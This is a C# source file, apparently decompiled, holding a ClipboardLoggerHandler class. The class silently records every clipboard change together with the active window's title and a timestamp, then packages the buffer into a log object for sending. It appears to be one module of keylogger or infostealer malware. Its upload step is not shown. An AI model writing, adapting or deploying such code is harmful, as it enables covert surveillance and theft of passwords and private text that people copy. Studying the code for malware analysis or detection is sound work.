using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class ClipboardLoggerHandler
{
	[AccessedThroughProperty("clipboardNotifier")]
	private static ClipboardNotifier _clipboardNotifier;

	private static StringBuilder tempClipLog;

	private static ClipboardNotifier clipboardNotifier
	{
		get
		{
			return _clipboardNotifier;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ClipboardNotifier.ChangedEventHandler value2 = clipboardNotifier_Changed;
			if (_clipboardNotifier != null)
			{
				_clipboardNotifier.Changed -= value2;
			}
			_clipboardNotifier = value;
			if (_clipboardNotifier != null)
			{
				_clipboardNotifier.Changed += value2;
			}
		}
	}

	public static void InitializeClipboardLogger()
	{
		clipboardNotifier = new ClipboardNotifier();
		tempClipLog = new StringBuilder();
		clipboardNotifier.Start();
	}

	public static Logs.Log SendClipLog()
	{
		string data = string.Empty;
		if (tempClipLog.Length > 1)
		{
			data = tempClipLog.ToString();
			tempClipLog.Remove(0, tempClipLog.Length);
		}
		clipboardNotifier.ResetTitle();
		return new Logs.Log(Logs.LogType.Clipboard, data);
	}

	private static void clipboardNotifier_Changed(object sender, ClipboardNotifier.ClipboardEventArgs e)
	{
		tempClipLog.AppendLine();
		if (e.Window.Changed)
		{
			tempClipLog.AppendLine($"[{e.Window.Name} - {e.DateTime.ToShortTimeString()}]");
		}
		tempClipLog.Append(e.ToString());
	}
}
